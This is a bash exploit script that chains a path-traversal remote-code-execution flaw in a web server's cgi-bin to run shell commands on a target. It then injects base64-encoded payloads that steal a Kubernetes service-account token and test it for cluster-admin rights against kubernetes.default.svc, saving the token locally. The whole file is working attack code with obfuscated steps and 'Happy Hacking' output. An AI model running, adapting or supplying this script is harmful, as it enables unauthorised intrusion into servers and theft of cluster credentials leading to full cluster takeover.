#!/bin/bash

#attach visa deployment
inject=$(cat templates/attack_get_token.sh | base64)

if [ $# -eq 0 ]
then
echo  "try: ./$0 http://ip:port"
exit 1
fi

function curl_target(){
curl -s "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
}

function attack(){
export hostname=$(curl_target $1 "cat /etc/hostname")
echo $hostname | grep -q "<html>" && echo '☹ - Target not Vulnerable' && exit || echo "☺ - Target ${hostname} Exploited" || echo '☹ - Exploit FAILED'
}

function pivot(){
export target_info=$(curl_target $1 "echo '${inject}' | base64 -d | bash -")
export hostname_pivot=$(echo ${target_info} | cut -f 1 -d " ")
[ ! -z "${target_info}" ] && echo "☺ - Target ${hostname_pivot} Exploited" && echo "☺ - Token extracted from ${hostname_pivot}" || echo '☹ - Exploit FAILED'
}

function check_token_privileges(){
echo " ☣☣☣ Checking Token Privileges ☣☣☣"
export token=$(echo ${target_info} | cut -f 2 -d " ")
commandb64='Y3VybCAtcyAtayAgXAogICAgIC1IICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIFwKICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJHt0b2tlbn0iIFwKICAgIC1kICd7ImtpbmQiOiJTZWxmU3ViamVjdEFjY2Vzc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJyZXNvdXJjZUF0dHJpYnV0ZXMiOnsidmVyYiI6IioiLCJyZXNvdXJjZSI6IioifX0sInN0YXR1cyI6eyJhbGxvd2VkIjpmYWxzZX19CicgXAogICAgaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzCg=='
inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
curl_target $1 "echo '${inject}' | base64 -d | bash -"  | grep -i -q 'allowed": true,' &&  echo $token > token && echo ☺ - kubernetes.default.svc:443 Access Confirmed from ${hostname} && echo ☺ - Token with cluster-admin Privileges Confirmed && echo ☣☣☣ Happy Hacking ☣☣☣
}

attack $1
pivot $1
check_token_privileges $1
